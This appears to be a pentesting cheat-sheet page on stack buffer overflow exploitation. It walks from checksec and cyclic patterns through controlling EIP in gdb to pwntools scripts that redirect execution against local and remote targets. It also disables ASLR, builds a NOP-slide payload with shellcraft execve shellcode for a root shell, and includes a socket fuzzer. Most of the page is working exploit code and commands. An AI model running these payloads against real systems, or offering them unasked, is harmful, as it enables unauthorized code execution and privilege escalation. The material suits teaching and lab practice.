---
title: Buffer Overflow Attack
desc: An anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
tags: [Binary, Buffer, Exe, Overflow, PrivEsc, Privilege, Pwndbg, Pwntools, Reverse]
alts: [Reverse-Engineering]
render_with_liquid: false
---

## Investigation

1. **Check Security Properties**

    ```sh
    checksec ./sampleExe
    ```

    1. **Binary Qualities**

        - **RELRO** - Relocation Read-Only, which makes the global offset table (GOT) read-only.
        - **Stack Canaries** - Tokens placed after a stack to detect a stack overflow.
        - **NX** - Non-Executable. It prevents from shellcode.
        - **RWX** - Read-Write-Executable. It's vulnerable to shellcode.
        - **PIE** - Position Independent Executable. It loads the program dependencies into random locations.

2. **Send Data to Check if the Operation**

    1. **Start Executable**

        - **Local**

            ```sh
            ./exampleExe
            ```

        - **Remote**

            ```sh
            nc <target-ip> <target-port>
            ```

    2. **Input String**

        After starting, input some string to check if the buffer overflow happens.

        ```sh
        # Input some string
        hello
        test

        # Input long string
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
        ```

<br />

## Crash Replication and Control EIP/RIP

Instruction Pointer (IP), which is called  the EIP on 32-bit machines, and the RIP on 64-bit machines.  
The IP points to the next instruction to be executed.

- **Local**

    1. **Generate Cyclic Pattern**

        Prepare a long string enough to overwrite the next instruction.

        ```sh
        # e.g. generate 100 characters
        cyclic 100 > pattern.txt
        # or
        msf-pattern_create -l 100 > pattern.txt
        ```

    2. **Start Debugging with GDB (Pwndbg)**

        Before starting gdb, it’s recommended to setup the **[Pwndbg](https://github.com/pwndbg/pwndbg){:target="_blank"}** for easily debugging.

        ```sh
        # exampleExe is the example of executable file
        gdb exampleExe
        ```

    3. **Run Program in Debugger**

        Use the generated text file of cyclic pattern for input.

        ```sh
        # r: run a program
        # Add an input from text file
        r < pattern.txt
        ```

        If the program crashes, check the invalid address and the EIP’s value of the  output.

        ```sh
        # They mean there is an invalid address at 0x4a4a4a.
        # Fir eip, it has been overwritten with 0x4a4a4a4a
        EIP  0x6161616a ('jaaa')

        Invalid address 0x6161616a
        ```

    4. **Generate an Exploitable Cyclic with Pwntools**

        **[Pwntools](https://github.com/Gallopsled/pwntools){:target="_blank"}** is an exploit development library.  
        It also generates the exploitable cyclic pattern for buffer overflow attack.

        1. **Create a Generator Named “cyclic.py”.**

            ```py
            from pwn import *

            padding = cyclic(cyclic_find('jaaa'))
            eip = p32(0xdeadbeef)
            payload = padding + eip
            print(payload)
            ```

        2. **Generate Pattern**

            Note that you need to run with **Python2**.

            ```sh
            python2 cyclic.py > pwncyclic.txt
            ```

        3. **Input the Cyclic in GDB**

            ```sh
            gdb exampleExe

            # ----------------------------------------

            # In debugger

            # Input the pwn cyclic
            r < pwncyclic.txt
            ```

            Make sure that there is an invalid address at 0xdeadbeef.

            ```sh
            EIP  0xdeadbeef

            Invalid address 0xdeadbeef
            ```

            Find the location of the target function which will be used to pwn in gdb.

            For example, the executable contains the vulnerable function named “print_sensitive()”:

            ```sh
            print& print_sensitive

            # e.g. the location of the output is "0x8048536"
            ```

        4. **Regenerate Cyclic Pattern**

            1. **Replace the Address in Payload**

                Replace the 0xdeadbeef in the payload named “cyclic.py” with the location of the vulnerable function (0x8048536 in here). 

                ```py
                ...

                eip = p32(0x8048536)

                ...
                ```

            2. **Regenerate**

                ```sh
                python2 cyclic.py > pwncyclic.txt
                ```

            3. **Run Program using New Cyclic Pattern**

                Run the program using this cyclic file as input.  
                You may be able to retrieve some sensitive data via the vulnerable function.

                ```sh
                ./exampleExe < pwncyclic.txt
                ```

- **Remote**

    1. **Create a Payload**

        **Pwntools** is useful here too.  
        Create "exploit.py".

        ```python
        from pwn import *

        connect = remote('<target-ip>', <target-port>)
        print(connect.recvn(18))
        payload = "A"*32
        payload += p32(0xdeadbeef)
        connect.send(payload)
        print(connect.recvn(34))
        ```

    2. **Run**

        ```sh
        python2 exploit.py
        ```

    3. **Create Shellcode**

        1. **Disable ASLR**

            To allow your shellcode works properly, you need to disable **Address Space Layout Randomization (ASLR)** by setting 0 to the config file.

            ```sh
            echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
            ```

        2. **Find EIP/RIP and ESP/RSP**

            Get control of the eip as in section 2.  
            Then make note of the esp/rsp (stack pointer in 32-bit/64-bit machine) address.

            ```sh
            cyclic 100 > pattern.txt

            gdb exampleExe
            > r < pattern.txt

            vim cyclic.py
            python2 cyclic.py > pattern_pwn.txt

            gdb exampleExe
            > r < pattern_pwn.txt
            ```

        3. **Create a Payload to Find the Breakpoint**

            Create "exploit.py".

            ```py
            from pwn import *

            padding = cyclic(cyclic_find('<found-characters>'))
            offset = 200
            eip = p32(<found-esp-address> + offset)
            # NOP assigned to 0x90
            nop_slide = "\x90" * 1000
            # Breakpoint is 0xcc
            shellcode = "\xcc"
            payload = padding + eip + nop_slide + shellcode
            print(payload)
            ```

            Then generate the cyclic pattern into text file.

            ```sh
            python2 exploit.py > pattern_breakpoint.txt
            ```

        4. **Direct Input the Cyclic Pattern into the Executable**

            ```sh
            ./exampleExe < pattern_breakpoint.txt
            ```

            You should find the breakpoint such as:

            ```
            Trace/breakpoint test
            ```

        5. **Generate Shellcode using Shellcraft**

            Copy the output of the following command.

            ```sh
            # Get a root shell

            # -f: format - assembly code
            shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
            # -f: format - string
            shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
            ```

        6. **Create a Payload for Getting a Root Shell**

            Create "shell.py"

            ```py
            from pwn import *

            proc = process('./intro2pwnFinal')
            proc.recvline()
            padding = cyclic(cyclic_find('<found-characters>'))
            offset = 200
            eip = p32(<found-esp-address> + offset)
            nop_slide = "\x90" * 1000
            shellcode = "<generated-shellcode-string>"
            payload = padding + eip + nop_slide + shellcode
            proc.send(payload)
            proc.interactive()
            ```

            Now you can get a root shell by executing this payload.

            ```sh
            python2 shell.py
            ```

<br />

## Fuzzing using Python

1. **Create Python Script**

    ```py
    import socket, time, sys

    ip = "<target-ip>"
    port = <target-port>
    timeout = 5
    prefix = "OVERFLOW1 "
    string = prefix + "A" * 100

    while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
    ```

2. **Run the Payload**

    When the fuzzer crashes the server with one of the strings, make a note of the largest number of bytes that were sent e.g. “1900 bytes”, “2000bytes”.

    ```sh
    python3 fuzzer.py
    ```